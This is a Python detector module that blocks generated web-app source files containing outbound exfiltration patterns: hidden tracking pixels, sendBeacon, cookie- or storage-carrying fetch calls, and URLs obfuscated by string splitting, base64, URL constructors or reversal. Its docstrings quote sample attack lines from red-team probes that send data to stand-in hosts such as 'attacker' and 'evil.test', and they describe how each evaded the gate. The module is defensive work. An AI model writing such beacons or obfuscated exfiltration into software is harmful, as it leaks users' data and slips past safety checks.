"""Outbound-network exfil pattern detector — QA-3 Fires 61 / 70.

Detects the narrow set of source-file patterns that ship user data to an
attacker-controlled URL at runtime. These are defense-in-depth against the
two empirical on-disk failures:

  Fire 61 — `setInterval` + `fetch('https://attacker/', {method:'POST',
            body: JSON.stringify({count})})` — period-poll exfil.
  Fire 70 — `<img src={pixelUrl} style={{display:'none'}} />` with
            `pixelUrl = 'https://attacker/?u=' + username + ...` — 1-pixel
            tracking beacon on every render.

Tsunami apps almost never need outbound network calls — most prompts are
counter / todo / dashboard / generator shapes. The gate blocks three call
shapes with no legitimate use in that context:

  1. `navigator.sendBeacon(externalUrl)` — fire-and-forget beaconing.
  2. Hidden-image tracking pixel: an `<img>` tag whose style sets
     `display: none` (or `visibility: hidden`) AND whose src is an external
     URL (directly or via a template / referenced variable).
  3. `fetch` / `new WebSocket` / `new EventSource` to an external URL where
     the surrounding ~500 chars reference `document.cookie`, `localStorage`,
     `sessionStorage`, `navigator.userAgent`, or `window.location.href` —
     the shape of state-exfil, not a normal data request.

Localhost / 127.* / RFC-1918 / 0.0.0.0 hosts pass (legit dev backends).

Pure function, no torch / no tool imports — unit-testable stand-alone.
"""

from __future__ import annotations

import base64
import re


_PRIVATE_HOST_RE = re.compile(
    r'^(localhost|127\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.|0\.0\.0\.0)'
)

# URL scheme pattern — match http:, https:, ws:, wss:, OR protocol-relative
# `//host`. QA-3 Fire 113 pointed out protocol-relative URLs (`//1.2.3.4/x`)
# bypassed the original `https?://` literal because browsers fill in the
# scheme from the host page at request time — a schemeless URL is still an
# outbound call. Optional scheme prefix; `//` is mandatory.
_URL_SCHEME = r'(?:https?:|wss?:)?//'
_URL_SCHEME_HTTP = r'(?:https?:)?//'  # for img src (no ws flavor)


def _is_external(host: str) -> bool:
    return not _PRIVATE_HOST_RE.match(host)


_SOURCE_SUFFIXES = (".tsx", ".ts", ".jsx", ".js", ".mjs", ".cjs", ".html", ".vue", ".svelte")


_EXFIL_STATE_KEYWORDS = re.compile(
    r'document\.cookie'
    r'|localStorage(?:\.getItem|\.\w+)?'
    r'|sessionStorage(?:\.getItem|\.\w+)?'
    r'|navigator\.userAgent'
    r'|window\.location\.href'
    r'|document\.location\.(?:href|host)'
)


def _host_of(url_match_group: str) -> str:
    """Strip trailing path/query from a captured host-plus."""
    # The regex already captures only up to first / or " — but be defensive.
    return url_match_group.split("/")[0].split("?")[0].split("#")[0]


def _scan_sendbeacon(content: str) -> list[str]:
    out = []
    for m in re.finditer(
        rf'\bsendBeacon\s*\(\s*[\'"`]{_URL_SCHEME_HTTP}([^\'"`/\s]+)',
        content,
    ):
        host = _host_of(m.group(1))
        if _is_external(host):
            out.append(f"navigator.sendBeacon → {host}")
    return out


def _scan_hidden_pixel(content: str) -> list[str]:
    """Find <img> tags with BOTH display:none (or visibility:hidden) AND an
    external-URL src — either inline, via template literal, or via a
    referenced variable whose value is an external URL string literal.
    """
    out = []
    img_re = re.compile(r'<img\b[^>]*?/?>', re.IGNORECASE | re.DOTALL)

    for m in img_re.finditer(content):
        tag = m.group(0)
        # Must be "hidden" somehow.
        hidden = re.search(
            r'display\s*:\s*[\'"]?none|visibility\s*:\s*[\'"]?hidden',
            tag,
            re.IGNORECASE,
        )
        if not hidden:
            continue

        # Direct inline src.
        direct = re.search(
            rf'src=[\'"`]{_URL_SCHEME_HTTP}([^\'"`\s/>]+)',
            tag,
            re.IGNORECASE,
        )
        if direct:
            host = _host_of(direct.group(1))
            if _is_external(host):
                out.append(f"hidden <img> → {host}")
                continue

        # JSX template literal src={`https://.../${...}`} or schemeless `//...`.
        tpl = re.search(
            rf'src=\{{`{_URL_SCHEME_HTTP}([^`/$\s]+)',
            tag,
            re.IGNORECASE,
        )
        if tpl:
            host = _host_of(tpl.group(1))
            if _is_external(host):
                out.append(f"hidden <img> → {host}")
                continue

        # JSX variable ref: src={pixelUrl} — resolve to a const/let/var
        # declaration elsewhere in the file. Checks both template and
        # plain-string literal forms.
        var_ref = re.search(r'src=\{(\w+)\}', tag)
        if var_ref:
            var = var_ref.group(1)
            for decl in re.finditer(
                rf'(?:const|let|var)\s+{re.escape(var)}\s*=\s*[`\'"]{_URL_SCHEME_HTTP}([^\'"`/${{\s]+)',
                content,
            ):
                host = _host_of(decl.group(1))
                if _is_external(host):
                    out.append(f"hidden <img> via {var} → {host}")
                    break

    return out


def _scan_network_with_state(content: str) -> list[str]:
    """fetch / WebSocket / EventSource to an external URL, where nearby
    code reads cookie / localStorage / sessionStorage / userAgent /
    window.location — the state-exfil shape.
    """
    out = []
    for m in re.finditer(
        rf'\b(?:fetch|new\s+WebSocket|new\s+EventSource)\s*\(\s*[\'"`]'
        rf'{_URL_SCHEME}([^\'"`\s/]+)',
        content,
    ):
        host = _host_of(m.group(1))
        if not _is_external(host):
            continue
        start = max(0, m.start() - 300)
        end = min(len(content), m.end() + 500)
        if _EXFIL_STATE_KEYWORDS.search(content[start:end]):
            out.append(f"fetch/WebSocket → {host} (carrying cookie/storage state)")
    return out


_STRING_CONCAT_RE = re.compile(
    r'(["\'])([^"\'`\\\n]*?)\1\s*\+\s*(["\'])([^"\'`\\\n]*?)\3'
)


def _fold_string_concats(content: str) -> str:
    """QA-3 Fire 114: attacker splits the URL across a string-concat —
    `const P1 = "http"; const P2 = "s://attacker/x"; fetch(P1 + P2)` —
    so neither literal matches the gate's `https?://` regex. At runtime
    JS coalesces them.

    Pre-fold adjacent `"X" + "Y"` same-quote literals into `"XY"` so
    the gate's scan runs against the coalesced form. Iterate to convergence
    to collapse N-way chains (`"a" + "b" + "c"` → `"ab" + "c"` → `"abc"`).

    Does NOT touch backticks (template literals) — those have their own
    interpolation semantics; a schemeless / concat template literal is a
    rarer pattern and addressing it requires richer parsing. Tracked as
    a follow-up if QA-3 probes show the variant.

    Also leaves identifier-concat (`P1 + P2`) alone — can't resolve that
    without constant-binding analysis. BUT the *declarations* are string
    literals adjacent in the source; feeding the full source through the
    existing gate AFTER fold doesn't catch `fetch(P1+P2)` directly. The
    trick is: the gate also catches an external hostname appearing in a
    const/var declaration via the hidden-pixel var-ref scan — which we
    generalize below in _scan_const_url_decl for the Fire 114 shape.
    """
    prev = None
    cur = content
    while prev != cur:
        prev = cur
        cur = _STRING_CONCAT_RE.sub(lambda m: f'{m.group(1)}{m.group(2)}{m.group(4)}{m.group(1)}', cur)
    return cur


_BASE64_URL_RE = re.compile(
    r'\batob\s*\(\s*[\'"]([A-Za-z0-9+/=]{12,})[\'"]\s*\)'
)
_BASE64_DECL_RE = re.compile(
    r'(?:const|let|var)\s+(\w+)\s*=\s*[\'"]([A-Za-z0-9+/=]{12,})[\'"]'
)


def _is_external_url_string(s: str) -> bool:
    """True if `s` (stripped) starts with `(https?:)?//` + an external host."""
    s = s.strip()
    m = re.match(r'(?:https?:)?//([^\s/\'"]+)', s)
    return bool(m and _is_external(_host_of(m.group(1))))


def _scan_base64_urls(content: str) -> list[str]:
    """QA-3 Fire 114 variant (b): `atob("aHR0cHM6Ly9ldmlsLnRlc3QvZXZpbA==")`.
    Attacker base64-encodes the URL so no literal `https://` appears in
    source; at runtime `atob` decodes back. Regex scans miss it. Decode
    inline atob calls; if the result is an external URL, flag it.

    Also handles the one-level-indirection shape:
      `const b64 = "aHR0...=="; const url = atob(b64);`
    — scan const/let/var declarations whose VALUE is a base64 string that
    decodes to an external URL.
    """
    out = []

    # Inline atob("..."): decode and check.
    for m in _BASE64_URL_RE.finditer(content):
        try:
            decoded = base64.b64decode(m.group(1), validate=True).decode(
                "utf-8", errors="replace"
            )
        except (ValueError, base64.binascii.Error):
            continue
        if _is_external_url_string(decoded):
            # Extract host for the error message.
            host_m = re.match(
                r'(?:https?:)?//([^\s/\'"]+)', decoded.strip()
            )
            host = _host_of(host_m.group(1)) if host_m else "unknown"
            out.append(f"atob-decoded URL → {host}")

    # Declared base64 constant (only if there's also an atob call in the
    # same file — otherwise it's just data, not a URL-decode).
    if not re.search(r'\batob\s*\(', content):
        return out
    for m in _BASE64_DECL_RE.finditer(content):
        try:
            decoded = base64.b64decode(m.group(2), validate=True).decode(
                "utf-8", errors="replace"
            )
        except (ValueError, base64.binascii.Error):
            continue
        if _is_external_url_string(decoded):
            host_m = re.match(
                r'(?:https?:)?//([^\s/\'"]+)', decoded.strip()
            )
            host = _host_of(host_m.group(1)) if host_m else "unknown"
            out.append(f"atob-decoded URL via {m.group(1)} → {host}")

    return out


def _scan_new_url_constructor(content: str) -> list[str]:
    """QA-3 Fire 114 variant (c): `new URL(path, "https://evil.test")`.
    The browser `URL(input, base)` constructor accepts a base URL as the
    second arg and resolves relative `input` against it — valid exfil
    channel that's not a plain `fetch("string")` pattern. Also catches
    single-arg `new URL("https://evil.test/x")`.

    Runs AFTER fold, so concat'd forms like `new URL(p, "http" + "s://…")`
    are flattened to a literal first.
    """
    out = []
    # Two-arg form: `new URL(<arg>, "URL")`.
    for m in re.finditer(
        r'\bnew\s+URL\s*\(\s*[^,]+?,\s*[\'"`]'
        rf'{_URL_SCHEME_HTTP}([^\'"`/\s]+)',
        content,
    ):
        host = _host_of(m.group(1))
        if _is_external(host):
            out.append(f"new URL(..., base=...) → {host}")
    # Single-arg form: `new URL("URL")`.
    for m in re.finditer(
        rf'\bnew\s+URL\s*\(\s*[\'"`]{_URL_SCHEME_HTTP}([^\'"`/\s]+)',
        content,
    ):
        host = _host_of(m.group(1))
        if _is_external(host):
            out.append(f"new URL(\"...\") → {host}")
    return out


def _scan_reverse_string_url(content: str) -> list[str]:
    """QA-3 Fire 114 variant (d): `".reversed".split("").reverse().join("")`.
    Common JS obfuscation: hide the URL by storing it reversed, then
    un-reverse at runtime. Match the canonical shape, reverse server-side,
    check if the result is an external URL.
    """
    out = []
    # The idiom can be called on a string literal OR on a variable. Match
    # both: first the literal form.
    for m in re.finditer(
        r'[\'"`]([^\'"`]{6,})[\'"`]\s*\.\s*split\s*\(\s*[\'"`]{2}\s*\)\s*'
        r'\.\s*reverse\s*\(\s*\)\s*\.\s*join\s*\(\s*[\'"`]{2}\s*\)',
        content,
    ):
        reversed_s = m.group(1)[::-1]
        if _is_external_url_string(reversed_s):
            host_m = re.match(
                r'(?:https?:)?//([^\s/\'"]+)', reversed_s.strip()
            )
            host = _host_of(host_m.group(1)) if host_m else "unknown"
            out.append(f"reverse-string URL → {host}")
    # Indirection: `const s = "REVERSED"; s.split("").reverse().join("")`.
    # If the file uses the reverse idiom on a variable AND that variable's
    # value reversed is an external URL, flag.
    uses_reverse = re.search(
        r'\.\s*split\s*\(\s*[\'"`]{2}\s*\)\s*\.\s*reverse\s*\(\s*\)\s*\.\s*join',
        content,
    )
    if uses_reverse:
        for m in re.finditer(
            r'(?:const|let|var)\s+(\w+)\s*=\s*[\'"]([^\'"`\n]+)[\'"]',
            content,
        ):
            reversed_s = m.group(2)[::-1]
            if _is_external_url_string(reversed_s):
                host_m = re.match(
                    r'(?:https?:)?//([^\s/\'"]+)', reversed_s.strip()
                )
                host = _host_of(host_m.group(1)) if host_m else "unknown"
                out.append(
                    f"reverse-string URL via {m.group(1)} → {host}"
                )
    return out


def _scan_split_url_declarations(content: str) -> list[str]:
    """Fire 114: direct detection of the split-URL pattern regardless of
    constant-folding. Find pairs of adjacent const/let/var declarations
    where the string literals, concatenated, form an external URL.
    """
    out = []
    # Capture const/let/var <name> = "literal" on each line.
    decl_re = re.compile(
        r'(?:const|let|var)\s+(\w+)\s*=\s*["\']([^"\'`\n]*)["\']\s*;?'
    )
    decls = [(m.group(1), m.group(2)) for m in decl_re.finditer(content)]
    # Look at adjacent declarations (by source order) whose values
    # concatenated would form http(s)://host/... with an external host.
    for i in range(len(decls) - 1):
        joined = decls[i][1] + decls[i + 1][1]
        m = re.match(r'(?:https?:)?//([^/\s]+)', joined)
        if m and _is_external(_host_of(m.group(1))):
            out.append(
                f"split-URL declarations {decls[i][0]} + {decls[i+1][0]} → {_host_of(m.group(1))}"
            )
        # 3-way: decls[i] + decls[i+1] + decls[i+2]
        if i + 2 < len(decls):
            joined3 = joined + decls[i + 2][1]
            m3 = re.match(r'(?:https?:)?//([^/\s]+)', joined3)
            if m3 and _is_external(_host_of(m3.group(1))):
                out.append(
                    f"split-URL declarations {decls[i][0]} + {decls[i+1][0]} + {decls[i+2][0]} → {_host_of(m3.group(1))}"
                )
    return out


def check_outbound_exfil(content: str, filename: str) -> str | None:
    """Return a BLOCKED error string if `content` (the bytes about to be
    written to `filename`) matches an outbound-network exfil pattern.
    Returns None if clean (most calls).

    Only scans source-like file extensions. Config-shape files (.env*,
    .npmrc, etc.) are handled by a separate gate in filesystem.py.
    """
    name_lower = filename.lower()
    if not name_lower.endswith(_SOURCE_SUFFIXES):
        return None

    # Fire 114: fold `"X" + "Y"` → `"XY"` so the existing regex-based
    # scans see the coalesced URL even when the source splits it.
    folded = _fold_string_concats(content)

    offenders: list[str] = []
    offenders.extend(_scan_sendbeacon(folded))
    offenders.extend(_scan_hidden_pixel(folded))
    offenders.extend(_scan_network_with_state(folded))
    # Fire 114: the exact shape is `const P1 = "http"; const P2 = "s://..."`
    # — two SEPARATE declarations, NOT joined by a `+` in source. Neither
    # fold nor the main scans catch it. Explicit detector for adjacent
    # declarations whose values concatenate to an external URL.
    offenders.extend(_scan_split_url_declarations(content))
    # Fire 114 variant (b): `atob("aHR0...")` base64 obfuscation.
    offenders.extend(_scan_base64_urls(content))
    # Fire 114 variant (c): `new URL(path, "https://host/")` constructor.
    offenders.extend(_scan_new_url_constructor(folded))
    # Fire 114 variant (d): `"REVERSED".split("").reverse().join("")`.
    offenders.extend(_scan_reverse_string_url(content))

    if not offenders:
        return None

    uniq = sorted(set(offenders))
    return (
        f"BLOCKED: {filename} contains outbound-network exfiltration "
        f"pattern(s): {'; '.join(uniq[:3])}. These are QA-3 Fire 61 / Fire 70 "
        f"attack shapes (hidden tracking pixel, sendBeacon beaconing, "
        f"fetch/WebSocket carrying cookie / localStorage / userAgent / "
        f"location state to an external host). Typical tsunami deliverables "
        f"don't need outbound calls — if genuinely required, point at "
        f"localhost / a private-net host or surface the data in a visible "
        f"UI element instead of a hidden beacon."
    )
